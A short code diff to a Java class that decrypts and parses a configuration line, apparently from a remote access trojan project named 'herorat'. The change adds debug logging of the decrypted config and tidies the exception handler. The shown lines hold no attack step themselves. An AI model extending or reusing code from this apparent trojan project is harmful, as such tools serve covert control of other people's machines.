@@ -6,6 +6,7 @@ import java.io.InputStreamReader;
 import net.herorat.features.startup.Startup;
 import net.herorat.network.Network;
 import net.herorat.utils.Crypto;
+import net.herorat.utils.Logger;
 
 
 public class Create
@@ -19,6 +20,7 @@ public class Create
 			if (line != null)
 			{
 				line = new String( Crypto.decrypt(Crypto.hexToByte(line)) );
+				Logger.log("Got from config: %s\n",line);
 				String[] config_data = line.split("###");
 				if (config_data.length >= 3)
 				{				
@@ -36,8 +38,8 @@ public class Create
 				}
 			}
 		}
-		catch (Exception e) {e.printStackTrace();}
-		
-		System.out.println("An error occured while reading the config file !");
+		catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 }
